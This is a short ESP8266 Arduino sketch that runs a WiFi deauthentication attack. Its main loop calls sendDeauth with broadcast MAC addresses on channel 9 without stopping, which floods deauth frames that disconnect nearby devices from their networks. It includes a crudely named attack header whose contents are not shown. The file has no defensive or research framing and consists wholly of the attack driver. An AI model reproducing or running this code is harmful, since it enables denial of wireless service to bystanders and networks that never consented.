#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <structs.h>
#include <FuckYourWifiInParticular.h>
#include <string_utils.h>


int ch = 9;
uint8_t originMac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
uint8_t attackMac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
uint8_t reason = 0x01;

void setup()
{
  // Serial setup
  Serial.begin(115200);
  delay(10);
  wifi_set_channel(9);

  // Wifi setup
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  WiFi.disconnect();

}

void loop(){
  sendDeauth(attackMac, originMac, reason, ch);
}